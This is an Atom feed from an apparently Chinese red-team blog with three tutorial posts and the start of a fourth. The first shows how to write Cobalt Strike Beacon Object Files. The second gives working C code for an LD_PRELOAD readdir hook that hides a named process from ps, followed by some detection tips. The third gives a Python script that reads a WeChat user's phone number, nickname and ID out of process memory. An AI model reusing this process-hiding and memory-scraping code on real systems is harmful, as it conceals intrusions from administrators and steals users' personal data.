<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2021-07-28T14:08:51.489Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CS 4.1 BOF开发</title>
    <link href="http://422926799.github.io/posts/e42bb01c.html"/>
    <id>http://422926799.github.io/posts/e42bb01c.html</id>
    <published>2021-07-28T13:54:39.000Z</published>
    <updated>2021-07-28T14:08:51.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BOF介绍"><a href="#BOF介绍" class="headerlink" title="BOF介绍"></a>BOF介绍</h2><p>信标对象文件 (BOF) 是一个已编译的 C 程序，按照约定编写，允许它在信标进程中执行并使用内部信标 API。BOF 是一种使用新的后开发功能快速扩展 Beacon 代理的方法。</p><h2 id="BOF是如何执行的"><a href="#BOF是如何执行的" class="headerlink" title="BOF是如何执行的"></a>BOF是如何执行的</h2><p>对于 Beacon 来说，BOF 只是一个位置无关的代码块，它接收指向某些 Beacon 内部 API 的指针。<br>对于 Cobalt Strike 而言，BOF 是由 C 编译器生成的目标文件。Cobalt Strike 解析此文件并充当其内容的链接器和加载器。这种方法允许您编写与位置无关的代码，用于 Beacon，而无需繁琐的体操来管理字符串和动态调用 Win32 API。</p><h2 id="BOF缺陷"><a href="#BOF缺陷" class="headerlink" title="BOF缺陷"></a>BOF缺陷</h2><ol><li>BOF 是调用 Win32 API 和有限 Beacon API 的单文件 C 程序。不要期望使用此机制链接其他功能或构建大型项目。</li><li>Cobalt Strike 不会将您的 BOF 链接到 libc。这意味着您仅限于编译器内部函数（例如，Visual Studio 上的 __stosb for memset）、公开的 Beacon 内部 API、Win32 API 以及您编写的函数。您可能无法通过 BOF 使用许多常用函数（例如 strlen、stcmp 等）。</li><li>BOF 在您的 Beacon 代理内部执行。如果 BOF 崩溃，有可能导致Beacon崩溃</li><li>Cobalt Strike 期望您的 BOF 是短时间运行的单线程程序。BOF 将阻止其他 Beacon 任务和功能的执行。异步或长时间运行的任务没有 BOF<br>模式。如果要构建长时间运行的功能，请考虑在牺牲进程内运行的反射 DLL。</li></ol><p>编译的方式</p><pre><code>要使用 Visual Studio 编译它：cl.exe /c /GS- hello.c /Fohello.o要使用 x86 MinGW 编译它：i686-w64-mingw32-gcc -c hello.c -o hello.o要使用 x64 MinGW 编译它：x86_64-w64-mingw32-gcc -c hello.c -o hello.o</code></pre><p>x64 beacon对应加载x64 gcc编译的bof文件，x86 beacon对应加载x86 gcc编译的bof文件</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><pre><code>* cs 4.1或者以上的版本* 从官方下载beacon.h -&gt; https://www.cobaltstrike.com/downloads/beacon.h</code></pre><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>cna主要使用的几个函数和过程：<br>先了解几个函数：</p><pre><code>* bof_pack - 打包参数传入到BOF里的函数* beacon_inline_execute - 调用BOF里面的函数</code></pre><p><strong>bof_pack</strong><br>$1 - Beacon ID<br>$2 - 打包数据的格式化字符串 -&gt; (例如Socket里的Packet操作)</p><pre><code>此函数将其参数打包成一个二进制结构，以便与&amp;beacon_inline_execute一起使用。此处的格式字符串选项对应于 BOF 文件可用的 BeaconData* C API。该 API 根据它可以打包的每种类型的要求处理数据和提示的转换。</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack</a></p><p><strong>beacon_inline_execute</strong><br>$1 - Beacon ID<br>$2 - 读取了BOF文件的数据<br>$3 - 要调用的函数名称<br>$4 - 要传递给BOF文件的打包参数</p><pre><code>执行信标对象文件</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute</a></p><p>BOF文件示例（有参数调用，无Windows API调用）:</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;void demo(char * args, int length) {    datap  parser; #参数结构定义    char * str_arg;    int    num_arg;    BeaconDataParse(&amp;parser, args, length); #准备数据解析器以从指定缓冲区中提取参数    str_arg = BeaconDataExtract(&amp;parser, NULL); #参数解析赋值于str_arg对应bof_pack函数参数2里的格式化字符串z    num_arg = BeaconDataInt(&amp;parser); #参数解析赋值于num_arg对应bof_pack函数参数2里的格式化字符串i    BeaconPrintf(CALLBACK_OUTPUT, &quot;Message is %s with %d arg&quot;, str_arg, num_arg);}</code></pre><p>cna文件示例：<br>cna调用BOF文件函数过程：</p><pre><code>* 先读取bof文件内容* 调用的函数是否需要参数* 调用函数入口点</code></pre><pre><code>alias hello {    btask($1, script_resource(&quot;demo.o&quot;));    $handle = openf(script_resource(&quot;demo.o&quot;)); #读取BOF文件    $data   = readb($handle, -1); #读取BOF文件内容    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;Raiden Mei Birthday&quot;, 413); #参数打包    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args); #调用BOF文件入口点}</code></pre><p>效果如下:<br><img src="https://z3.ax1x.com/2021/07/28/W7sow9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/28/W7yBp6.png" alt=""></p><p>调用Windows API<br>下载<a href="https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式" target="_blank" rel="noopener">https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式</a><br>（自己测试的时候获取失败了，不过看了一下人手转BOF格式也可以）</p><pre><code>python3 bof_helper.py DsGetDcNameA██████╗  ██████╗ ███████╗██╔══██╗██╔═══██╗██╔════╝██████╔╝██║   ██║█████╗██╔══██╗██║   ██║██╔══╝██████╔╝╚██████╔╝██║╚═════╝  ╚═════╝ ╚═╝BOF Helper by @dtmsecurity[Library] DsGetDcNameA is probably in NetApi32[Declaration] DWORD WINAPI DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);[BOF Helper]DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yojS.png" alt=""></p><p>例如CreateProcessA</p><pre><code>BOOL CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>到了BOF就变成这样<br>DECLSPEC_IMPORT WINBASEAPI &lt;类型&gt; &lt;API类型&gt; DLL名$&lt;从DLL里面导出的API名称&gt;</p><pre><code>DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>更多示例</p><pre><code>DECLSPEC_IMPORT WINBASEAPI void * __cdecl MSVCRT$memset(void *_Dst,int _Val,size_t _Size);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CreateProcessA (LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, WINBOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$QueueUserAPC (PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$ResumeThread (HANDLE hThread);</code></pre><p>demo2.c （无参数，windows API调用）</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);void demo(char * args, int length) {    STARTUPINFOA si = { 0 };    si.cb = sizeof(si);    PROCESS_INFORMATION pi = { 0 };    BOOL Test = KERNEL32$CreateProcessA(NULL, &quot;C:\\Windows\\System32\\notepad.exe&quot;, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &amp;si, &amp;pi);}</code></pre><p>demo.cna</p><pre><code>alias hello {    btask($1, script_resource(&quot;demo2.o&quot;));    $handle = openf(script_resource(&quot;demo2.o&quot;));    $data   = readb($handle, -1);    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;&quot;, 0);    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args);}</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yv90.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cobaltstrike.com/help-beacon-object-files" target="_blank" rel="noopener">https://www.cobaltstrike.com/help-beacon-object-files</a><br><a href="https://www.cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html</a><br><a href="http://evilash.me/2020/08/18/BOF.html" target="_blank" rel="noopener">http://evilash.me/2020/08/18/BOF.html</a><br><a href="https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c" target="_blank" rel="noopener">https://github.com/boku7/HOLLOW/blob/main/hollow.x64.c</a> - 这个例子不错</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BOF介绍&quot;&gt;&lt;a href=&quot;#BOF介绍&quot; class=&quot;headerlink&quot; title=&quot;BOF介绍&quot;&gt;&lt;/a&gt;BOF介绍&lt;/h2&gt;&lt;p&gt;信标对象文件 (BOF) 是一个已编译的 C 程序，按照约定编写，允许它在信标进程中执行并使用内部信标 API。BO</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>Linux 通过LD_PRELOAD实现进程隐藏</title>
    <link href="http://422926799.github.io/posts/906527f2.html"/>
    <id>http://422926799.github.io/posts/906527f2.html</id>
    <published>2021-07-26T09:20:12.000Z</published>
    <updated>2021-07-26T10:13:28.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id="LD-PRELOAD介绍"><a href="#LD-PRELOAD介绍" class="headerlink" title="LD_PRELOAD介绍"></a>LD_PRELOAD介绍</h2><p>好问题！实际上，/etc/ld.so.preload在某种程度上取代了LD_PRELOAD。<br>由于安全问题，LD_PRELOAD受到严格限制：它不能执行任意setuid二进制文件，因为如果可以，您可以用您自己的恶意代码替换库例程，例如参见此处的一个很好的讨论。事实上，你可以在ld.so’user manual 中阅读：</p><blockquote><p>LD_PRELOAD 要在所有其他库之前加载的附加、用户指定的 ELF 共享库列表。列表的项目可以用空格或冒号分隔。这可用于选择性地覆盖其他共享库中的函数。使用描述下给出的规则搜索库。对于 set-user-ID/set-group-ID ELF 二进制文件，包含斜杠的预加载路径名将被忽略，并且只有在库文件上启用了 set-user-ID 权限位时才会加载标准搜索目录中的库。<br>相反，文件/etc/ld.so.preload没有这样的限制，这个想法是，如果你可以读/写目录/etc，你已经拥有 root 凭据。因此它的使用。请记住，您可以使用/etc/ld.so.preload即使您一开始似乎没有：它只是glibc 的一个特性，因此是所有 Linux 发行版的一个特性（但不是，最好的我对 Unix 风格的了解），因此您可以创建它并将任何Linux 发行版中的任何setuid 库的名称放入其中，它就会起作用。</p></blockquote><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p><img src="https://z3.ax1x.com/2021/07/26/WfYGh6.png" alt=""><br>（也不知道这两个函数怎么知道是系统调用抽出来的）</p><p>ps命令获取进程过程：</p><pre><code>* openat打开/proc/&lt;pid&gt;/&lt;file&gt;* read读取* write输出</code></pre><p>通过执行<code>strace -f ps -elf 2&gt;&amp;1</code>即可得出结论<br><img src="https://z3.ax1x.com/2021/07/26/WfYo40.png" alt=""></p><p>上面那个github的原理就是hook了readdir。github上面那个通过利用循环里的continue跳过匹配的进程返回，但是会造成bug，稍微修改了一下，最终结果如下</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp); //获取目录流文件描述符    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd); //拼接路径得到目录流文件路径    ssize_t ret = readlink(tmp, buf, size); //读取符号链接的值 (读取链接的目录)    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) { //枚举出PID目录        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid); //拼接得到/porc/&lt;pid&gt;/stat文件路径    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf); //读取完/porc/&lt;pid&gt;/stat文件内容匹配出进程名称    return 1;}static struct dirent* (*original_readdir)(DIR*) = NULL; //构造readdir函数原型 https://linux.die.net/man/3/readdirstatic const char* process_to_filter = &quot;ruby&quot;; //需要被隐藏的进程名称struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;); //通过dlsym来获取readdir函数地址                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        dp=original_readdir(dirp); //通过调用readdir函数读取目录        char dirname[256];        char processname[256];        get_dir_name(dirp,dirname,sizeof(dirname)); //获取当前所在目录        if(strcmp(dirname,&quot;/proc&quot;)==0){ //目录文件等于/proc                get_process_name(dp-&gt;d_name,processname);  //由于目录文件是/proc，那么文件名(d_name)肯定是pid，所以获取要打开的文件名                if(strcmp(processname,process_to_filter)==0){ //当进程名称符合要屏蔽的进程名不返回                }else{                        return dp;                }        }}</code></pre><p>while循环continue屏蔽</p><pre><code class="C">#define _GNU_SOURCE#include &lt;dirent.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)static struct dirent* (*original_readdir)(DIR*) = NULL;static const char* process_to_filter = &quot;ruby&quot;;struct dirent *readdir(DIR *dirp){        if(original_readdir == NULL) {                original_readdir = dlsym(RTLD_NEXT, &quot;readdir&quot;);                if(original_readdir==NULL){                        printf(&quot;readdir Address Get Failure,Error Code:%d\n&quot;,dlerror());                }        }        struct dirent* dp;        while(1){                dp=original_readdir(dirp);                char dirname[256];                char processname[256];                get_dir_name(dirp,dirname,sizeof(dirname));                if(strcmp(dirname,&quot;/proc&quot;)==0){                        get_process_name(dp-&gt;d_name,processname);                        if(strcmp(processname,process_to_filter)==0){                                continue;                        }                }                break;        }        return dp;}</code></pre><p>静态编译:<br><code>gcc -shared -fpic example.c -o example.so</code><br><code>LD_PRELOAD=/home/kali/Desktop/example.so /usr/bin/ps -elf</code> #指定程序使用</p><p>从这些code里面可以明白写LD HOOK的时候，需准备以下操作：</p><pre><code>* 被HOOK的目标函数是否通过libc抽象出来调用的，比如说getuid这种就不是。C原生的，非C原生的都要HOOK C原生函数* 实例化被HOOK函数原型* 通过dlsym寻找被HOOK原函数的地址，赋予定义的函数原型变量* 调用原函数获取内容，判断后是否要return</code></pre><p>PS:最好还是用while continue屏蔽</p><p><img src="https://z3.ax1x.com/2021/07/26/Wftm5t.png" alt=""></p><h2 id="etc-ld-so-preload测试的问题"><a href="#etc-ld-so-preload测试的问题" class="headerlink" title="/etc/ld.so.preload测试的问题"></a>/etc/ld.so.preload测试的问题</h2><p>使用了/etc/ld.so.preload (最好不要用，由于是全局使用容易出现大规模的问题) -&gt; 匹配到不是进程名称的就return返回<br><img src="https://z3.ax1x.com/2021/07/26/WftBMF.png" alt=""><br><img src="https://z3.ax1x.com/2021/07/26/WfsYOx.png" alt=""><br>（测试遇到这个问题先删除so，在删除/etc/ld.so.preload）</p><p>while循环continue虽然可以避免这个问题，但是执行ps的时候会出现bug<br><img src="https://z3.ax1x.com/2021/07/26/WfswkD.png" alt=""></p><p>防止这种操作蒙蔽双眼：<br>I、检查LD_PRELOAD环境变量是否有异常<br>II、检查ld.so.preload 等配置文件是否有异常<br>III、自己写个python小工具，直接读取/proc中的内容，对于ps等工具的结果，对不上，则存在被劫持可能<br>IV、使用sysdig（有开源版，可以监控ps等的调用过程，观察是否有恶意动态库被加载。strace有类似功能）或者prochunter（google 上search）<br>sysdig proc.name=ps or strace -f ps -elf 2&gt;&amp;1</p><p>遍历/poc目录，获取进程PID。读取/proc/<pid>/stat文件 -&gt; 读取/proc/<pid>/cmdline得到要执行的命令行参数</pid></pid></p><pre><code class="python">import osdef getprocess():    path=os.listdir(&quot;/proc&quot;)    for p in path:        tmplen=0        for n in range(0,10):            for c in p:                if c==str(n):                    tmplen+=1        if len(p)==tmplen:            print(&quot;------PID:{}-----&quot;.format(p))            print(open(&quot;/proc/{}/stat&quot;.format(p),&quot;r&quot;).read())            print(open(&quot;/proc/{}/cmdline&quot;.format(p),&quot;r&quot;).read())getprocess()</code></pre><p><img src="https://z3.ax1x.com/2021/07/26/WfaEb4.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://linux.die.net/man/3/readdir" target="_blank" rel="noopener">https://linux.die.net/man/3/readdir</a><br><a href="https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html" target="_blank" rel="noopener">https://pubs.opengroup.org/onlinepubs/007904875/functions/readdir_r.html</a><br><a href="https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/" target="_blank" rel="noopener">https://techoverflow.net/2019/06/20/how-to-fix-c-error-rtld_next-undeclared/</a><br><a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a><br><a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>现成工具:<a href="https://github.com/gianlucaborello/libprocesshider" target="_blank" rel="noopener">https://github.com/gianlucaborello/libprocesshider</a><br>原理文章:<a href="https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/" target="_blank" rel="noopener">https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;LD-PRELOAD介绍&quot;&gt;&lt;a href=&quot;#LD-PRELOAD介绍&quot; class=&quot;headerlink&quot; title=&quot;LD_PRELOAD介绍&quot;&gt;&lt;/a&gt;LD_PRELOAD介绍&lt;/h2&gt;&lt;p&gt;好问题！实际上，/etc/ld.so.preload在某种程</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>读取微信内存里的信息</title>
    <link href="http://422926799.github.io/posts/26c63b49.html"/>
    <id>http://422926799.github.io/posts/26c63b49.html</id>
    <published>2021-07-20T16:34:51.000Z</published>
    <updated>2021-07-20T16:55:42.790Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>参考链接:<a href="https://blog.csdn.net/weixin_30230009/article/details/105100181" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30230009/article/details/105100181</a><br>需要了解知识：<br>基址 -&gt; 基址在程序下次运行时是不会改变的<br>-&gt;每次重启进程，模块加载的地址会变</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>寻找对应的信息基本方法如下:<br>打开CE附加微信进程，搜索微信号等关键字，然后找到基址 （绿色的就是），双击添加到地址列表<br><img src="https://z3.ax1x.com/2021/07/21/WU1snP.png" alt=""></p><p>PS：这里重启了几次wx，所以CE里的地址和上图对不上 (一开始忘记截了)<br>对着地址双击就能看到对应的地址<br><img src="https://z3.ax1x.com/2021/07/21/WU1y0f.png" alt=""></p><p>然后OD定位到对应的内存地址去查询<br>command: dd <address><br>可以看到开头就是微信号 （打码的手机号）等信息<br><img src="https://z3.ax1x.com/2021/07/21/WU1678.png" alt=""></address></p><p>我们只需要知道基址然后：模块加载地址+基址</p><p>怎么求基址-&gt;偏移地址-dll加载地址=基址<br>这里求手机号基址为例，在od鼠标在内存窗口单机刚刚找到的那个地址点击手机号第一个数字，然后记录下地址，在CE手动添加地址里面输入，类型选字符串<br>即可看见手机号（手机号长度11所以长度设置11）<br><img src="https://z3.ax1x.com/2021/07/21/WU1h1s.png" alt=""></p><p>dll加载地址，CE点击手动添加地址，输入dll名称，类型选4字节<br><img src="https://z3.ax1x.com/2021/07/21/WU15Xq.png" alt=""></p><p>然后将数值改为十六进制（即可得到地址）<br><img src="https://z3.ax1x.com/2021/07/21/WU1TBV.png" alt=""></p><p>或者你也可以用OD或者Process Explorer里获取加载dll地址<br>（注：这后面截的图与上方地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU177T.png" alt=""></p><p>求出手机号基址<br>53D0F560:手机号内存地址<br>52CC0000:dll加载地址<br>53D0F560-52CC0000=104F560 -&gt; WeChatWin.dll(52CC0000)+104F560=手机号<br><img src="https://z3.ax1x.com/2021/07/21/WU1qNF.png" alt=""></p><p>所以以此类推获取：微信号、微信名称等基址<br>WeChatWin.dll+104F52C - wx名<br>WeChatWin.dll+104F690 - wx号地址<br>WeChatWin.dll+104F560 - 手机号</p><p>（找到信息的时候可以切成地址，然后往下滑）<br><img src="https://z3.ax1x.com/2021/07/21/WU1X9J.png" alt=""></p><p>注意事项：遇到指针的话，先获取指针里的值。然后在用这个值当作地址找<br>在找wx号的时候就遇到了<br>（算出第一个基址后，求别的时候只需要把后面三个数字给替换掉就知道了,emmmmmm）<br><img src="https://z3.ax1x.com/2021/07/21/WU1vcR.png" alt=""></p><p>此时046F35D0里面的地址放着微信号<br>（PS:这里地址微信重启过，和上面的图地址对不上）<br><img src="https://z3.ax1x.com/2021/07/21/WU3Snx.png" alt=""></p><p>构造读取<br>使用的Windows API:OpenProcess、ReadProcessMemory</p><pre><code class="python">from ctypes import *from win32con import *from ctypes.wintypes import *from win32process import (EnumProcessModules,GetModuleFileNameEx)import osCreateToolhelp32Snapshot=windll.Kernel32.CreateToolhelp32SnapshotProcess32First=windll.kernel32.Process32FirstProcess32Next=windll.kernel32.Process32NextOpenProcess = windll.kernel32.OpenProcessReadProcessMemory = windll.kernel32.ReadProcessMemoryCloseHandle = windll.kernel32.CloseHandleTH32CS_SNAPPROCESS=0x00000002TH32CS_SNAPMODULE = 0x00000008MAX_MODULE_NAME32 = 255class PROCESSENTRY32A(Structure): #定义PROCESSENTRY32A类型    _fields_ = [ ( &#39;dwSize&#39; , c_ulong ) ,                 ( &#39;cntUsage&#39; , c_ulong) ,                 ( &#39;th32ProcessID&#39; , c_ulong) ,                 ( &#39;th32DefaultHeapID&#39; , c_size_t) ,                 ( &#39;th32ModuleID&#39; , c_ulong) ,                 ( &#39;cntThreads&#39; , c_ulong) ,                 ( &#39;th32ParentProcessID&#39; , c_ulong) ,                 ( &#39;pcPriClassBase&#39; , c_long) ,                 ( &#39;dwFlags&#39; , c_ulong) ,                 ( &#39;szExeFile&#39; , c_char * MAX_PATH ) ]def getprocess_pid(processname):    processimage=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0)    pe32=PROCESSENTRY32A()    pe32.dwSize=sizeof(PROCESSENTRY32A)    ret=Process32First(processimage,pointer(pe32))    while ret:        if pe32.szExeFile.decode()==processname:            return pe32.th32ProcessID        ret=Process32Next(processimage,pointer(pe32))def getmodule_address(handle,dllname):    for module in EnumProcessModules(handle):        dllpath=GetModuleFileNameEx(handle,module)        print(module,dllpath)def main():    wetchatwindlladdress=0x63B60000 #枚举WetChatWin.dll加载地址失败，就直接手动定义了    phome = create_string_buffer(11)    wxname=create_string_buffer(20)    wxnumber=c_int(20)    number=create_string_buffer(20)    pid=getprocess_pid(&quot;WeChatStore.exe&quot;)    print(&quot;WeChat PID:{}&quot;.format(pid))    process=OpenProcess(PROCESS_ALL_ACCESS,False,pid)    ReadProcessMemory(process,wetchatwindlladdress+0x104F560,byref(phome),11,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F52C,byref(wxname),20,None)    ReadProcessMemory(process,wetchatwindlladdress+0x104F690,byref(wxnumber),20,None)    print(&quot;WX Phome:&quot;+hex(wetchatwindlladdress + 0x104F560),phome.value.decode())    print(&quot;WX Name:&quot;+hex(wetchatwindlladdress+0x104F52C),wxname.value.decode())    wxnumberaddress=wxnumber.value #可以不用转十六进制，直接十进制即可,py转十六进制默认是str类型。。hex函数转后填进地址读不到    ReadProcessMemory(process,wxnumberaddress,byref(number),20,None)    print(&quot;WX Number:&quot;+number.value.decode())    #getmodule_address(handle,&quot;WeChatWin.dll&quot;)if __name__ == &#39;__main__&#39;:    main()</code></pre><p><img src="https://z3.ax1x.com/2021/07/21/WU3PAO.png" alt=""></p><p>踩坑记录：</p><pre><code>* 调用EnumProcess和用Thread32First枚举模块，结果根本不能完全枚举。原本想模仿Process Explorer调用ZwQueryVirtualMemory函数枚举模块，py写起来太麻烦。。算了</code></pre><p>这种方法也可以用来干别</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;参考链接:&lt;a href=&quot;https://blog.csdn.net/weixin_30230009/article/details/10</summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>HolesWarm蠕虫简陋分析</title>
    <link href="http://422926799.github.io/posts/1d42cb0b.html"/>
    <id>http://422926799.github.io/posts/1d42cb0b.html</id>
    <published>2021-07-18T19:04:48.000Z</published>
    <updated>2021-07-18T19:34:45.407Z</updated>
    
